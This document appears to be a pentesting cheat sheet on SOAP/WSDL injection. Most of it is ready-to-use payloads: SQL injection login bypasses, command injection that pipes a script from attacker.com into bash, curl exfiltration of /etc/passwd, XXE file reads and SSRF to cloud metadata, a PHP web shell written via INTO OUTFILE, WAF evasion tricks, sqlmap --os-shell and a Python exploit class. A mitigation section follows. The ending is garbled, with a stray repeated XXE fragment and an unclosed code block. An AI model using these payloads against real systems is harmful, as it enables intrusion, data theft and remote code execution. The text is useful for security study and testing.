### 🛡️ SOAP WSDL Injection (XML/SOAP SQLi & Command Execution)

**SOAP WSDL Injection** is an attack technique that exploits vulnerabilities in SOAP-based web services, particularly when user input within SOAP messages is improperly handled. This can lead to SQL injection, command execution, XML injection, and more.

  * **How It Works:** SOAP messages are XML-based. If input fields like `<username>` or `<password>` are directly concatenated into backend SQL queries or system commands without sanitization, attackers can inject malicious payloads.
  * **Common Entry Points:** SOAP action endpoints, WSDL-defined operations, XML parameters within `<soap:Body>`.
  * **Impact:** Unauthorized access, data leakage, remote code execution, denial of service.

### 📝 Basic SOAP SQL Injection Payloads

  * **Authentication Bypass via SOAP**

    ```xml
    <?xml version="1.0" encoding="UTF-8"?>
    <soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
        <soap:Body>
            <LoginRequest>
                <username>admin' OR '1'='1</username>
                <password>anything</password>
            </LoginRequest>
        </soap:Body>
    </soap:Envelope>
    ```
    
    **Why it's used:** To bypass login logic by making the SQL condition always true.
    **How it works:** The `' OR '1'='1` closes the string and adds a true condition, often returning the first user.

  * **UNION-Based Data Extraction via SOAP**

    ```xml
    <username>admin' UNION SELECT 1,2,3 -- -</username>
    ```
    
    **Why it's used:** To extract data by appending a UNION query.
    **How it works:** The UNION operator merges results from another SELECT statement, allowing data exfiltration.

  * **Comment-Based SQL Injection in SOAP**

    ```xml
    <username>admin' --</username>
    <password>anything</password>
    ```
    
    **Why it's used:** To comment out the rest of the SQL query.
    **How it works:** The `--` sequence comments out the password check in the SQL query.

-----

### 🚀 SOAP-Based Command Injection (RCE)

  * **Basic Command Injection via SOAP**

    ```xml
    <username>admin' OR 1=1; id; -- -</username>
    ```
    
    **Why it's used:** To execute shell commands if input is passed to `system()` or `exec()`.
    **How it works:** The semicolon allows command chaining in Unix systems.

  * **Command Injection with Argument Chaining**

    ```xml
    <filename>../../etc/passwd; cat /etc/shadow</filename>
    ```
    
    **Why it's used:** To chain multiple commands in file operation parameters.
    **How it works:** Using shell operators like `;`, `&`, `|`, or `&&` to execute additional commands.

  * **Remote Code Execution via SOAP Parameters**

    ```xml
    <command>ping 127.0.0.1 && curl http://attacker.com/shell.sh | bash</command>
    ```
    
    **Why it's used:** When SOAP operations execute system commands directly.
    **How it works:** Injecting shell commands that download and execute malicious scripts.

-----

### 📁 File Operations via SOAP Injection

  * **Reading Files via SOAP SQL Injection**

    ```xml
    <username>admin' UNION SELECT LOAD_FILE('/etc/passwd'),2,3 -- -</username>
    ```
    
    **Why it's used:** To read local files if the database supports `LOAD_FILE()`.
    **How it works:** The file content is returned as a column in the query result.

  * **File Write/Web Shell Upload**

    ```xml
    <username>admin' UNION SELECT "<?php system($_GET['cmd']); ?>",2,3 INTO OUTFILE '/var/www/html/shell.php' -- -</username>
    ```
    
    **Why it's used:** To upload a backdoor for persistent access.
    **How it works:** Using `INTO OUTFILE` to write arbitrary content to a web-accessible directory.

-----

### 🔥 Advanced SOAP Injection: XXE via SOAP

  * **XXE Injection in SOAP Body**

    ```xml
    <?xml version="1.0"?>
    <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
    <soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
        <soap:Body>
            <LoginRequest>
                <username>&xxe;</username>
                <password>123</password>
            </LoginRequest>
        </soap:Body>
    </soap:Envelope>
    ```
    
    **Why it's used:** To read local files via XML External Entity (XXE) injection.
    **How it works:** The `&xxe;` entity references the external file, which is included in the SOAP response.

  * **XXE for SSRF via SOAP**

    ```xml
    <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/"> ]>
    <username>&xxe;</username>
    ```
    
    **Why it's used:** To perform Server-Side Request Forgery (SSRF) and access internal services.
    **How it works:** The SOAP server makes a request to the internal URL and returns the response.

  * **XXE Data Exfiltration via HTTP**

    ```xml
    <!DOCTYPE foo [
    <!ENTITY % file SYSTEM "file:///etc/passwd">
    <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
    %dtd;
    ]>
    <username>&exfil;</username>
    ```
    
    **Why it's used:** To exfiltrate file contents via HTTP requests.
    **How it works:** Using parameter entities to send file content to an attacker-controlled server.

-----

### 🛠️ SOAP WSDL Enumeration & Discovery

  * **WSDL Enumeration via SOAP Action**

    ```http
    POST /wsdl HTTP/1.1
    Host: target.com
    SOAPAction: "urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping"
    Content-Type: text/xml

    <?xml version="1.0"?>
    <soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
        <soap:Body>
            <AddPortMapping>
                <NewRemoteHost></NewRemoteHost>
                <NewExternalPort>4444</NewExternalPort>
                <NewProtocol>TCP</NewProtocol>
                <NewInternalPort>4444</NewInternalPort>
                <NewInternalClient>192.168.1.100</NewInternalClient>
                <NewEnabled>1</NewEnabled>
                <NewPortMappingDescription>evil</NewPortMappingDescription>
                <NewLeaseDuration>0</NewLeaseDuration>
            </AddPortMapping>
        </soap:Body>
    </soap:Envelope>
    ```
    
    **Why it's used:** To discover and interact with SOAP services, potentially leading to command injection.
    **How it works:** SOAP actions may map to backend functions that handle system commands.

  * **WSDL Information Disclosure**

    ```http
    GET /service.asmx?wsdl HTTP/1.1
    Host: target.com
    ```
    
    **Why it's used:** To obtain the WSDL definition file containing all available operations.
    **How it works:** WSDL files describe the SOAP service interface, exposing all methods and parameters.

-----

### 🧪 Real-World SOAP Injection Examples

  * **Case Study: SAP SOAP Injection (CVE-2018-2380)**
    * **What happened:** SOAP injection in SAP NetWeaver allowed attackers to execute arbitrary SQL queries.
    * **How it worked:** Attackers injected SQL into SOAP XML parameters, leading to data exfiltration and system compromise.

  * **Example: SOAP Login Bypass**

    ```http
    POST /LoginService.asmx HTTP/1.1
    SOAPAction: "http://tempuri.org/Login"
    Content-Type: text/xml

    <?xml version="1.0" encoding="utf-8"?>
    <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
      <soap:Body>
        <Login xmlns="http://tempuri.org/">
          <username>admin' --</username>
          <password>anything</password>
        </Login>
      </soap:Body>
    </soap:Envelope>
    ```
    
    **Result:** The SQL query becomes:
    ```sql
    SELECT * FROM users WHERE username='admin' --' AND password='anything'
    ```
    Logging in as admin without a password.

  * **SOAP Injection with Error-Based SQLi**

    ```xml
    <username>admin' AND 1=CONVERT(int, (SELECT @@version)) --</username>
    ```
    
    **Why it's used:** To extract database version information through error messages.
    **How it works:** Triggering type conversion errors that include sensitive data in the error response.

-----

### 🛡️ Bypassing SOAP Web Application Firewalls (WAFs)

  * **Case Variation and Encoding**

    ```xml
    <username>AdMiN' Or '1'='1</username>
    ```
    
    **Why it's used:** To bypass case-sensitive WAF rules.
    **How it works:** Alternating letter casing to avoid keyword detection.

  * **XML Comment Injection**

    ```xml
    <username>admin'<!-- XML comment --> OR '1'='1</username>
    ```
    
    **Why it's used:** To break up SQL keywords within XML.
    **How it works:** Inserting XML comments between SQL keywords to evade pattern matching.

  * **Hex Encoding in SOAP**

    ```xml
    <username>admin' OR 0x31=0x31 --</username>
    ```
    
    **Why it's used:** To encode payloads and bypass string-based filters.
    **How it works:** Using hex representation of characters to hide malicious keywords.

  * **CDATA Section Bypass**

    ```xml
    <username><![CDATA[admin' OR '1'='1]]></username>
    ```
    
    **Why it's used:** CDATA sections may be processed differently by parsers and WAFs.
    **How it works:** Embedding payload within CDATA sections to avoid XML parsing.

-----

### 📡 Advanced Data Exfiltration Techniques via SOAP

  * **Time-Based Data Exfiltration via SOAP**

    ```xml
    <username>admin' AND IF(ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>64, SLEEP(5), 0) --</username>
    ```
    
    **Why it's used:** When traditional data return is blocked or monitored.
    **How it works:** Using time delays to infer data character by character.

  * **DNS-Based Exfiltration via SOAP**

    ```xml
    <username>admin' UNION SELECT LOAD_FILE(CONCAT('\\\\', (SELECT password FROM users LIMIT 1), '.attacker.com\\a')) --</username>
    ```
    
    **Why it's used:** To bypass network restrictions and exfiltrate data via DNS queries.
    **How it works:** Forcing the database to resolve a domain containing stolen data.

  * **HTTP Request Exfiltration**

    ```xml
    <command>curl http://attacker.com/?data=$(cat /etc/passwd | base64)</command>
    ```
    
    **Why it's used:** When the server can make outbound HTTP requests.
    **How it works:** Using system commands to send HTTP requests containing stolen data.

-----

### 🕵️‍♀️ Detection and Exploitation Tools for SOAP

  * **sqlmap – Automated SOAP SQL Injection**

    ```bash
    sqlmap -u "http://target.com/service.asmx" --data="<xml>payload</xml>" --content-type="text/xml" --dbs
    sqlmap -u "http://target.com/service.asmx" --data="<xml>payload</xml>" --content-type="text/xml" -D dbname -T users --dump
    sqlmap -u "http://target.com/service.asmx" --data="<xml>payload</xml>" --content-type="text/xml" --os-shell
    ```
    
    **Why it's used:** To automate detection, exploitation, and data exfiltration.
    **How it works:** sqlmap sends crafted SOAP payloads, analyzes responses, and escalates access.

  * **Burp Suite – Manual SOAP Testing**

    **Why it's used:** For manual payload testing, fuzzing, and analyzing SOAP responses.
    **How it works:** Using Burp's Proxy, Repeater, and Intruder tools to send custom SOAP payloads.

  * **soapUI – SOAP Testing Framework**

    ```bash
    # Create test suite for WSDL
    soapUI -w http://target.com/service.asmx?wsdl
    
    # Run security scans
    soapUI -t http://target.com/service.asmx -s "SecurityTest"
    ```
    
    **Why it's used:** For comprehensive SOAP service testing and vulnerability scanning.
    **How it works:** Generating and sending various SOAP messages to test for vulnerabilities.

  * **Custom Python Scripts for SOAP Exploitation**

    ```python
    import requests
    from lxml import etree
    
    class SOAPExploiter:
        def __init__(self, url, soap_action):
            self.url = url
            self.soap_action = soap_action
            self.headers = {
                "SOAPAction": soap_action,
                "Content-Type": "text/xml"
            }
            
        def inject_sql(self, payload):
            soap_body = f"""
            <?xml version="1.0"?>
            <soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
                <soap:Body>
                    <LoginRequest>
                        <username>{payload}</username>
                        <password>test</password>

                </soap:Body>
            </soap:Envelope>
            """
            
            response = requests.post(self.url, data=soap_body, headers=self.headers)
            return response.text
            
        def xxe_attack(self, entity_payload):
            soap_body = f"""<?xml version="1.0"?>
            <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "{entity_payload}"> ]>
            <soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
                <soap:Body>
                    <LoginRequest>
                        <username>&xxe;</username>
                        <password>test</password>
                    </LoginRequest>
                </soap:Body>
            </soap:Envelope>
            """
            
            response = requests.post(self.url, data=soap_body, headers=self.headers)
            return response.text
    
    # Usage
    exploiter = SOAPExploiter("http://target.com/service.asmx", "Login")
    
    # Test SQL injection
    print(exploiter.inject_sql("admin' OR '1'='1"))
    
    # Test XXE
    print(exploiter.xxe_attack("file:///etc/passwd"))
    ```
    
    **Why it's used:** To automate SOAP injection testing with custom payloads.
    **How it works:** Programmatically generating and sending malicious SOAP messages.

-----

### 🛡️ Prevention and Mitigation Strategies for SOAP

  * **Use Parameterized Queries (Prepared Statements)**

    ```csharp
    // .NET example with parameterized queries
    string query = "SELECT * FROM users WHERE username = @username AND password = @password";
    SqlCommand cmd = new SqlCommand(query, connection);
    cmd.Parameters.AddWithValue("@username", username);
    cmd.Parameters.AddWithValue("@password", password);
    ```
    
    **Why it's used:** To separate SQL logic from data, preventing injection.
    **How it works:** Placeholders are used for input, ensuring it is treated as data, not code.

  * **XML Input Validation and Sanitization**

    ```csharp
    // Validate XML against schema
    XmlReaderSettings settings = new XmlReaderSettings();
    settings.DtdProcessing = DtdProcessing.Prohibit; // Disable DTD processing
    settings.XmlResolver = null; // Disable external entities
    settings.ValidationType = ValidationType.Schema;
    
    using (XmlReader reader = XmlReader.Create(input, settings))
    {
        // Process XML
    }
    ```
    
    **Why it's used:** To reject malicious XML input before processing.
    **How it works:** Validating XML against a strict schema and disabling dangerous features.

  * **Disable XXE Processing**

    ```java
    // Java example - disable XXE
    DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
    dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
    dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
    dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
    dbf.setExpandEntityReferences(false);
    ```
    
    **Why it's used:** To prevent XML External Entity attacks.
    **How it works:** Configuring XML parsers to reject external entity declarations.

  * **Least Privilege Principle for SOAP Services**

    **Why it's used:** To limit the damage if injection occurs.
    **How it works:** SOAP service accounts should have only the permissions necessary for their role (e.g., no `DROP`, `GRANT`, or file system access).

  * **Web Application Firewalls (WAFs) with SOAP Awareness**

    **Why it's used:** To detect and block SOAP injection attempts in real-time.
    **How it works:** WAFs analyze incoming SOAP messages for malicious patterns and block suspicious requests.

  * **Regular Security Audits and Penetration Testing**

    **Why it's used:** To identify and fix vulnerabilities before attackers exploit them.
    **How it works:** Conduct code reviews, automated scanning, and manual testing to uncover SOAP injection flaws.

  * **Input Whitelisting**

    ```python
    # Python input validation example
    import re
    
    def validate_username(username):
        # Allow only alphanumeric characters, 3-20 characters long
        pattern = r'^[a-zA-Z0-9]{3,20}$'
        if re.match(pattern, username):
            return True
        return False
    ```
    
    **Why it's used:** To reject any input that doesn't match expected patterns.
    **How it works:** Defining strict patterns for allowed input and rejecting everything else.

  * **SOAP Message Encryption and Signing**

    ```xml
    <!-- WS-Security example -->
    <soap:Header>
        <wsse:Security>
            <wsse:UsernameToken>
                <wsse:Username>admin</wsse:Username>
                <wsse:Password Type="...#PasswordDigest">hashed_password</wsse:Password>
            </wsse:UsernameToken>
            <wsu:Timestamp>
                <wsu:Created>2024-01-01T00:00:00Z</wsu:Created>
                <wsu:Expires>2024-01-01T00:05:00Z</wsu:Expires>
            </wsu:Timestamp>
        </wsse:Security>
    </soap:Header>
    ```
    
    **Why it's used:** To ensure message integrity and confidentiality.
    **How it works:** Using WS-Security standards to encrypt and sign SOAP messages.

-----

### 🧬 Advanced SOAP Attack Scenarios

  * **Second-Order SOAP Injection**

    ```xml
    <!-- First request - store malicious payload -->
    <username>admin' --</username>
    
    <!-- Second request - trigger the stored payload -->
    <resetToken>stored_token_from_previous_request</resetToken>
    ```
    
    **Why it's used:** When input is stored and later used in a query without sanitization.
    **How it works:** The attacker injects payloads that are harmless when stored but become active when retrieved.

  * **SOAP Action Spoofing**

    ```http
    POST /service.asmx HTTP/1.1
    Host: target.com
    SOAPAction: "http://tempuri.org/AdminDeleteAllData"
    Content-Type: text/xml
    ```
    
    **Why it's used:** To invoke privileged operations by guessing or discovering SOAP actions.
    **How it works:** Changing the SOAPAction header to target different backend methods.

  * **WSDL Scanning for Hidden Operations**

    ```bash
    # Extract all operations from WSDL
    curl -s http://target.com/service.asmx?wsdl | grep -o 'operation name="[^"]*"' | cut -d'"' -f2
    ```
    
    **Why it's used:** To discover undocumented or administrative SOAP operations.
    **How it works:** Parsing the WSDL file to enumerate all available service methods.

  * **SOAP Array Injection**

    ```xml
    <items>
        <item>normal</item>
        <item>malicious' OR '1'='1</item>
        <item>normal</item>
    </items>
    ```
    
    **Why it's used:** When SOAP arrays are processed item by item.
    **How it works:** Injecting malicious payloads into array elements that might be processed individually.

    <!ENTITY % file SYSTEM "file:///etc/passwd">
    <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
    %dtd;
    ]>
    ```

  * **WSDL Discovery Queries**

    ```http
    <!-- Get WSDL -->
    GET /service.asmx?wsdl HTTP/1.1
    
    <!-- Get single operation WSDL -->
    GET /service.asmx?op=GetUser&wsdl HTTP/1.1
    
    <!-- Test SOAP action -->
    POST /service.asmx HTTP/1.1
    SOAPAction: "http://tempuri.org/TestMethod"
